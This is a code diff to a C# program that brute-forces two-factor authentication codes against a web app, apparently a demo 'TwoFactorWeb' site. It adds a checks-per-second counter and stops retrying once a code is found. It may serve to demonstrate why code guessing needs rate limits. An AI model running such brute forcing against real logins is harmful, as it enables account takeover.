@@ -19,6 +19,11 @@ namespace TwoFactorBruteForceAttempt
                 toRetry.Add(i);
             }
 
+            DateTime lastPrinted = DateTime.Now;
+            int x = 0;
+
+            object lockobj = new object();
+
             do
             {
                 List<int> toTry = new List<int>(toRetry);
@@ -70,6 +75,7 @@ namespace TwoFactorBruteForceAttempt
                             if (redirectHeader == "/TwoFactorWeb/")
                             {
                                 Console.WriteLine("Found Two Factor Code: {0}", code);
+                                toRetry = new List<int>();
 
                                 state.Break();
                                 return;
@@ -80,6 +86,19 @@ namespace TwoFactorBruteForceAttempt
                     {
                         toRetry.Add(i);
                         System.Threading.Thread.Sleep(500);
+                    }
+
+                    lock (lockobj)
+                    {
+                        x++;
+
+                        if (lastPrinted < DateTime.Now - TimeSpan.FromSeconds(10))
+                        {
+                            Console.WriteLine("Checking {0} per second", x / (DateTime.Now - lastPrinted).TotalSeconds);
+
+                            x = 0;
+                            lastPrinted = DateTime.Now;
+                        }
                     }
                 });
             } while (toRetry.Count > 0);
